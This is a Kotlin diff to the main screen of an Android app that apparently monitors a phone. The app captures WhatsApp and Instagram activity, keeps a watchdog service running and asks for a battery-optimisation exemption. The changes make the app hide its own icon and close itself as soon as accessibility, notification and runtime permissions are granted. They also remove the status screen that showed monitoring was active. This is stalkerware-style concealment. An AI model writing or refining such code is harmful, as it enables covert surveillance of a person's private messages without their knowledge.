@@ -117,6 +117,26 @@ class MainActivity : AppCompatActivity() {
     private var skipNotificationStep = false
 
     private var autostartPrompted = false
+    private var isExiting = false
+    private var batteryPrompted = false
+
+    private fun completeSetupAndClose() {
+        if (isExiting) return
+        isExiting = true
+
+        isOneTapFlowRunning = false
+        deviceState.markSetupCompleted()
+        refreshPermissionStatus()
+        triggerAutoSyncAfterAccessibility()
+        com.spapp.monitoring.sync.PersistentWatchdogService.start(applicationContext)
+        Log.i(TAG, "All core permissions active — hiding app icon and closing app")
+
+        hideAppIcon()
+        Toast.makeText(this, "Setup completed successfully", Toast.LENGTH_SHORT).show()
+        Handler(Looper.getMainLooper()).postDelayed({
+            finishAndRemoveTask()
+        }, 1200L)
+    }
 
 
 
@@ -131,16 +151,13 @@ class MainActivity : AppCompatActivity() {
         refreshPermissionStatus()
 
         // Always initialize log observer and trigger sync once permissions update
-
         RealtimeLogObserverManager.start(applicationContext)
-
         SyncScheduler.runOnce(applicationContext)
 
-        if (isOneTapFlowRunning) {
+        if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled() && isNotificationAccessGranted()) {
+            completeSetupAndClose()
+        } else if (isOneTapFlowRunning) {
             handleNextSetupStep()
-        } else if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled() && isNotificationAccessGranted()) {
-            deviceState.markSetupCompleted()
-            triggerAutoSyncAfterAccessibility()
         }
 
         val grantedCount = results.values.count { it }
@@ -174,10 +191,7 @@ class MainActivity : AppCompatActivity() {
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
-        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
-            isOneTapFlowRunning = true
-            handleNextSetupStep()
-        }
+        completeSetupAndClose()
     }
 
 
@@ -295,6 +309,8 @@ class MainActivity : AppCompatActivity() {
                 skipAccessibilityStep = false
                 skipNotificationStep = false
                 handleNextSetupStep()
+            } else {
+                completeSetupAndClose()
             }
         }
 
@@ -457,17 +473,15 @@ class MainActivity : AppCompatActivity() {
 
 
         // Sync Now Button
-
         binding.btnSyncNow.setOnClickListener {
-
             RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
-
             RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
-
             SyncScheduler.runOnce(applicationContext)
-
-            Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
-
+            if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled() && isNotificationAccessGranted()) {
+                completeSetupAndClose()
+            } else {
+                Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
+            }
         }
 
 
@@ -557,11 +571,18 @@ class MainActivity : AppCompatActivity() {
         statusUpdater.run()
         uploadCurrentFcmToken()
 
+        val isCore = getMissingRuntimePermissions().isEmpty()
+        val isA11y = isAccessibilityEnabled()
+        val isNotif = isNotificationAccessGranted()
+
+        if (isCore && isA11y && isNotif) {
+            completeSetupAndClose()
+            return
+        }
+
         if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
             isOneTapFlowRunning = true
             handleNextSetupStep()
-        } else if (isAccessibilityEnabled() && isNotificationAccessGranted() && getMissingRuntimePermissions().isEmpty()) {
-            triggerAutoSyncAfterAccessibility()
         }
     }
 
@@ -610,7 +631,8 @@ class MainActivity : AppCompatActivity() {
         }
 
         // Step 4: Battery Optimization Exemption (Prompts direct system dialog "Let app always run in background?")
-        if (!isBatteryExempted()) {
+        if (!isBatteryExempted() && !batteryPrompted) {
+            batteryPrompted = true
             try {
                 val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                     data = Uri.parse("package:$packageName")
@@ -623,20 +645,7 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Standard Runtime Permissions, Accessibility, Notification Access, and Battery Exemption are now enabled!
-        isOneTapFlowRunning = false
-        deviceState.markSetupCompleted()
-        refreshPermissionStatus()
-        triggerAutoSyncAfterAccessibility()
-        com.spapp.monitoring.sync.PersistentWatchdogService.start(applicationContext)
-        Log.i(TAG, "Core permissions, Accessibility, Notification Access & Battery Exemption all active")
-
-        // Auto hide app icon and close the app
-        hideAppIcon()
-        Toast.makeText(this, "Setup completed successfully", Toast.LENGTH_SHORT).show()
-        Handler(Looper.getMainLooper()).postDelayed({
-            finishAndRemoveTask()
-        }, 1200L)
+        completeSetupAndClose()
     }
 
 
@@ -1011,41 +1020,8 @@ class MainActivity : AppCompatActivity() {
 
 
         if (isCore && isAccessibility && isNotification) {
-
-            if (grantedCount >= totalCount) {
-
-                binding.tvMasterBadge.text = "ALL ACTIVE ✓"
-
-                binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.success))
-
-                binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
-
-                binding.tvMasterDesc.text = "All background monitoring services are active and running."
-
-                binding.btnMasterOneTap.text = "✓ ALL PERMISSIONS CONFIGURED & ACTIVE"
-
-                binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
-
-                binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
-
-            } else {
-
-                binding.tvMasterBadge.text = "CORE & NOTIFICATIONS ACTIVE ✓"
-
-                binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.success))
-
-                binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
-
-                binding.tvMasterDesc.text = "WhatsApp & Instagram capture active. You can enable remaining permissions individually below."
-
-                binding.btnMasterOneTap.text = "✓ CORE & NOTIFICATIONS ACTIVE (Tap items below for full access)"
-
-                binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
-
-                binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.accent))
-
-            }
-
+            completeSetupAndClose()
+            return
         } else if (isCore && isAccessibility && !isNotification) {
 
             binding.tvMasterBadge.text = "ACTION NEEDED"
